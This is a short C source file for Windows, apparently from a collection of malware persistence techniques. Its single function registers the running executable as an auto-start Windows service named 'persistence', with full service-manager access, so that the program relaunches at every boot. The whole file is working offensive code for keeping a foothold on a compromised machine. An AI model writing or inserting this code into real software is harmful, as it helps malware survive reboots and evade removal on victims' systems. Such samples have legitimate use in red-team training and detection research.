#include "PersistViaWindowsServices.h"


BOOLEAN PersistViaWindowsServices()
{

	SC_HANDLE schSCManager = NULL;
	SC_HANDLE	schService = NULL;

	WCHAR ExePath[MAX_PATH];
	GetModuleFileNameW(NULL, ExePath, MAX_PATH);

	if (!(schSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS)))
	{
		PRINT_ERROR("OpenSCManagerW");
		return FALSE;
	}

	if (!(schService = CreateServiceW(schSCManager, L"persistence", L"persistence", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, ExePath, NULL, NULL, NULL, NULL, NULL)))
	{
		PRINT_ERROR("CreateServiceW");
		return FALSE;
	}

	CloseServiceHandle(schSCManager);
	CloseServiceHandle(schService);

	return TRUE;

}